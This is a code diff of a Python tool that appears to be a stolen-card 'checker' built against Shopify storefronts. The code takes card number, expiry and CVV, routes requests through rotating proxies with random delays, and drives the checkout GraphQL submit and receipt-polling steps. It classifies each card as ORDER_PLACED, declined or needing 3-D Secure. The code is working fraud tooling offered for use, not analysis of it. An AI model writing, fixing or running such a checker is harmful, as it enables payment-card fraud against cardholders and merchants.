+                    error_codes = [e.get('code', 'UNKNOWN') for e in res.get('errors', [])]
+                    if error_codes:
+                        return False, "DECLINED - " + ", ".join(error_codes)
+                    if attempt_num < max_retries - 1:
+                        await asyncio.sleep(0.5)
+                        continue
+                    return False, "DECLINED - Submit errors"
+                
+                data = res.get('data', {})
+                submit = data.get('submitForCompletion', {})
+                typename = submit.get('__typename', '')
+                
+                if typename in ('SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion'):
+                    receipt = submit.get('receipt', {})
+                    self.receipt_id = receipt.get('id')
+                    
+                    if not self.receipt_id:
+                        return False, "DECLINED - No receipt ID"
+                    
+                    self.logger.data_extracted("Receipt ID", self.receipt_id.split('/')[-1], "Submit")
+                    
+                    receipt_type = receipt.get('__typename', '')
+                    
+                    if receipt_type == 'ProcessingReceipt':
+                        poll_delay = receipt.get('pollDelay', 500) / 1000
+                        await asyncio.sleep(poll_delay)
+                        return await self.poll_receipt(graphql_headers)
+                        
+                    elif receipt_type == 'ProcessedReceipt':
+                        return True, "ORDER_PLACED"
+                        
+                    elif receipt_type == 'ActionRequiredReceipt':
+                        return False, "ACTIONREQUIREDRECEIPT"
+                        
+                    elif receipt_type == 'FailedReceipt':
+                        error_info = receipt.get('processingError', {})
+                        error_code = error_info.get('code', 'GENERIC_ERROR')
+                        msg = error_info.get('messageUntranslated', '')
+                        if msg:
+                            return False, "DECLINED - {} - {}".format(error_code, msg[:50])
+                        return False, "DECLINED - {}".format(error_code)
                     else:
-                        return False, "DECLINED - PROCESSING_TIMEOUT"
+                        return False, "Unknown receipt: {}".format(receipt_type)
                 
-                elif receipt_type == 'ActionRequiredReceipt':
-                    return True, "APPROVED - 3DS_REQUIRED"
-                    
+                elif typename == 'SubmitRejected':
+                    errors = submit.get('errors', [])
+                    error_msgs = []
+                    for e in errors:
+                        code = e.get('code', 'UNKNOWN')
+                        error_msgs.append(code)
+                    if error_msgs:
+                        return False, "DECLINED - " + "; ".join(error_msgs[:3])
+                    return False, "DECLINED - Submit rejected"
+                
+                elif typename == 'SubmitFailed':
+                    return False, "DECLINED - " + str(submit.get('reason', 'Submit failed'))[:50]
+                
+                elif typename == 'Throttled':
+                    poll_after = submit.get('pollAfter', 1000)
+                    self.queue_token = submit.get('queueToken', self.queue_token)
+                    variables['input']['queueToken'] = self.queue_token
+                    payload['variables'] = variables
+                    await asyncio.sleep(poll_after / 1000.0)
+                    continue
+                
+                elif typename == 'CheckpointDenied':
+                    return False, "DECLINED - Checkpoint denied"
+                
                 else:
-                    if poll_attempts < max_attempts:
-                        await asyncio.sleep(1.0)
+                    if attempt_num < max_retries - 1:
+                        await asyncio.sleep(0.5)
                         continue
-                    return False, f"Unknown receipt: {receipt_type}"
+                    return False, "Unknown response: {}".format(typename)
                     
+            except httpx.ProxyError:
+                self.proxy_status = "Dead 🚫"
+                return False, "PROXY_DEAD"
             except httpx.TimeoutException:
-                if poll_attempts < max_attempts:
-                    await asyncio.sleep(1.0)
+                if attempt_num < max_retries - 1:
+                    await asyncio.sleep(0.5)
                     continue
                 return False, "TIMEOUT"
-            except Exception:
-                if poll_attempts < max_attempts:
-                    await asyncio.sleep(1.0)
+            except Exception as e:
+                if attempt_num < max_retries - 1:
+                    await asyncio.sleep(0.5)
                     continue
-                return False, "POLL_ERROR"
+                return False, "Submit error: {}".format(str(e)[:50])
         
-        return False, "DECLINED - TIMEOUT"
+        return False, "DECLINED - Max retries exceeded"
 
-    # ========== MAIN EXECUTION FLOW ==========
+    async def poll_receipt(self, headers, max_polls=10):
+        self.step(8, "POLL RECEIPT", "Polling for payment status")
+        
+        graphql_url = f"{self.base_url}/checkouts/unstable/graphql"
+        
+        poll_headers = {
+            **headers,
+            'accept': 'application/json',
+            'content-type': 'application/json',
+            'x-checkout-web-server-rendering': 'no'
+        }
+        
+        poll_query = 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}'
+        
+        poll_variables = {
+            "receiptId": self.receipt_id,
+            "sessionToken": self.session_token
+        }
+        
+        poll_payload = {
+            "query": poll_query,
+            "operationName": "PollForReceipt",
+            "variables": poll_variables
+        }
+        
+        for poll_attempt in range(max_polls):
+            try:
+                resp = await self.client.post(
+                    graphql_url,
+                    headers=poll_headers,
+                    json=poll_payload,
+                    timeout=30
+                )
+                
+                if resp.status_code != 200:
+                    await asyncio.sleep(2)
+                    continue
+                
+                try:
+                    data = resp.json()
+                    receipt = data.get('data', {}).get('receipt', {})
+                    tn = receipt.get('__typename', '')
+                    
+                    if tn == 'ProcessedReceipt':
+                        self.logger.success_log("Payment processed", f"After {poll_attempt + 1} polls")
+                        return True, "ORDER_PLACED"
+                        
+                    elif tn == 'ActionRequiredReceipt':
+                        return False, "ACTIONREQUIREDRECEIPT"
+                        
+                    elif tn == 'FailedReceipt':
+                        err = receipt.get('processingError', {})
+                        code = err.get('code', 'GENERIC_ERROR')
+                        msg = err.get('messageUntranslated', '')
+                        if msg:
+                            return False, "DECLINED - {} - {}".format(code, msg[:50])
+                        return False, "DECLINED - {}".format(code)
+                        
+                    elif tn in ('ProcessingReceipt', 'WaitingReceipt'):
+                        delay = receipt.get('pollDelay', 4000) / 1000
+                        await asyncio.sleep(max(delay, 2))
+                        continue
+                    
+                    else:
+                        await asyncio.sleep(2)
+                        continue
+                        
+                except:
+                    await asyncio.sleep(2)
+                    continue
+                    
+            except:
+                await asyncio.sleep(2)
+                continue
+        
+        return False, "DECLINED - Polling timeout"
+
     async def execute_checkout(self, cc, mes, ano, cvv):
         try:
-            # Get proxy
             self.step(0, "GET PROXY", "Getting proxy")
             
             if PROXY_SYSTEM_AVAILABLE:
@@ -1773,69 +1490,41 @@ class ShopifyMiddleEasternCheckout:
                 self.proxy_status = "No Proxy"
                 self.client = httpx.AsyncClient(timeout=30, follow_redirects=True)
             
-            # Step 0: Initialize session
-            success, result = await self.initialize_session()
-            if not success:
-                return False, result
+            success, result = await self.visit_homepage()
+            if not success: return False, result
             await self.random_delay()
             
-            # Step 1: Visit product page
             success, result = await self.visit_product_page()
-            if not success:
-                return False, result
+            if not success: return False, result
             await self.random_delay()
             
-            # Step 2: Add to cart
             success, result = await self.add_to_cart()
-            if not success:
-                return False, result
+            if not success: return False, result
             await self.random_delay()
             
-            # Step 2.5: Get product section (CRITICAL for cookie chain)
-            await self.get_product_section()
-            await self.random_delay()
-            
-            # Step 3: Start checkout
-            success, result = await self.start_checkout()
-            if not success:
-                return False, result
+            success, result = await self.go_to_checkout()
+            if not success: return False, result
             await self.random_delay(0.5, 0.8)
             
-            # Step 4: Get checkout page
             success, result = await self.get_checkout_page()
-            if not success:
-                return False, result
+            if not success: return False, result
             await self.random_delay()
             
-            # Step 5: Submit initial proposal
-            success, result = await self.submit_initial_proposal()
-            if not success:
-                return False, result
-            await self.random_delay()
-            
-            # Step 6: Create PCI payment session
             success, payment_session_id = await self.create_payment_session(cc, mes, ano, cvv)
-            if not success:
-                return False, payment_session_id
+            if not success: return False, payment_session_id
             await self.random_delay()
             
-            # Step 7: Submit billing proposal
-            success, result = await self.submit_billing_proposal(cc, payment_session_id)
-            if not success:
-                return False, result
-            await self.random_delay()
-            
-            # Step 8: Submit for completion + poll
-            success, result = await self.submit_for_completion(cc, payment_session_id)
-            
+            success, result = await self.submit_for_completion(payment_session_id, cc)
             return success, result
             
         except Exception as e:
-            self.logger.error_log("UNKNOWN", f"Checkout error: {str(e)}")
-            return False, f"Checkout error: {str(e)[:50]}"
+            self.logger.error_log("UNKNOWN", str(e)[:100])
+            return False, "Checkout error: {}".format(str(e)[:50])
         finally:
             if self.client:
                 await self.client.aclose()
+            if self.pci_client:
+                await self.pci_client.aclose()
 
 
 # ========== MAIN CHECKER CLASS ==========
@@ -1855,7 +1544,7 @@ class ShopifyMiddleEasternChecker:
             
             if not cc or not mes or not ano or not cvv:
                 elapsed_time = time.time() - start_time
-                self.logger.error_log("INVALID_FORMAT", f"Could not parse card")
+                self.logger.error_log("INVALID_FORMAT", "Could not parse card")
                 return format_shopify_response("", "", "", "", "Invalid card format", elapsed_time, username, user_data, self.proxy_status)
 
             if len(cc) < 15 or len(cc) > 19:
@@ -1887,16 +1576,16 @@ class ShopifyMiddleEasternChecker:
 
         except Exception as e:
             elapsed_time = time.time() - start_time
-            self.logger.error_log("UNKNOWN", str(e))
+            self.logger.error_log("UNKNOWN", str(e)[:100])
             try:
-                parsed_cc, parsed_mes, parsed_ano, parsed_cvv = parse_card_input(card_details)
-                if parsed_cc:
-                    cc, mes, ano, cvv = parsed_cc, parsed_mes, parsed_ano, parsed_cvv
+                parsed = parse_card_input(card_details)
+                if parsed:
+                    cc, mes, ano, cvv = parsed
                 else:
                     cc = mes = ano = cvv = ""
             except:
                 cc = mes = ano = cvv = ""
-            return format_shopify_response(cc, mes, ano, cvv, f"UNKNOWN_ERROR: {str(e)[:30]}", elapsed_time, username, user_data, self.proxy_status)
+            return format_shopify_response(cc, mes, ano, cvv, "UNKNOWN_ERROR: " + str(e)[:30], elapsed_time, username, user_data, self.proxy_status)
 
 
 # ========== COMMAND HANDLER ==========
